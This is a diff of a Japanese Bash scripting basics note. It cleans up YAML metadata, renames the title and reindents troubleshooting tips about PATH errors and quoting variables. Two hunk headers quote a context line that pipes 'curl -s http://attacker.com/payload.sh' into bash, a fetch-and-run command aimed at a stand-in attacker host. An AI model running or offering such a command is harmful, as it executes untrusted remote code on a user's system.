@@ -1,16 +1,21 @@
 ---
 tags:
-  - 'shell'
-  - 'bash'
-  - 'scripting'
-  - 'automation'
-  - 'bash'
-  - 'chmod'
-  - 'environment_variables'
-  - 'pipes_redirections'
+  - shell
+  - bash
+  - scripting
+  - automation
+  - chmod
+  - environment_variables
+  - pipes_redirections
+created: 2025-06-29 15:02
+modified: 2026-01-22 20:22
+environment:
+  - OS/Linux
+vulnearability: []
+knowledge_category: OS
 ---
 
-# シェルスクリプティング基礎 (Bash)
+# OS  - Linux - シェルスクリプティング基礎 (Bash)
 
 ## 概要
 
@@ -135,13 +140,13 @@ curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
 
 1. **エラーメッセージ例 1**: `command not found`
 
-      * **考えられる原因**: `PATH` が通っていないか、コマンドのタイプミス。スクリプト内で `cd` して相対パスが変わった可能性もあります。
-      * **解決策**: コマンドをフルパスで指定するか、`PATH` を確認します。
+			* **考えられる原因**: `PATH` が通っていないか、コマンドのタイプミス。スクリプト内で `cd` して相対パスが変わった可能性もあります。
+			* **解決策**: コマンドをフルパスで指定するか、`PATH` を確認します。
 
 2. **エラーメッセージ例 2**: `[: too many arguments`
 
-      * **考えられる原因**: `if [ $VAR == "some string" ]` のように、スペースを含む可能性のある変数をダブルクォートで囲んでいません。
-      * **解決策**: `if [ "$VAR" == "some string" ]` のように、必ず変数をダブルクォートで囲んでください。
+			* **考えられる原因**: `if [ $VAR == "some string" ]` のように、スペースを含む可能性のある変数をダブルクォートで囲んでいません。
+			* **解決策**: `if [ "$VAR" == "some string" ]` のように、必ず変数をダブルクォートで囲んでください。
 
 ## 環境変数と設定ファイル
 
@@ -170,5 +175,4 @@ curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
 
 * **`set -euo pipefail`**: スクリプトの冒頭にこの「非公式ストリクトモード」を記述すると、エラー発生時に即座に終了するなど、より安全な動作になります。
 * **デバッグ**: `bash -x my_script.sh` で実行するか、スクリプト冒頭に `set -x` と記述すると、実行されるコマンドが一行ずつ表示され、デバッグに非常に役立ちます。
-
 
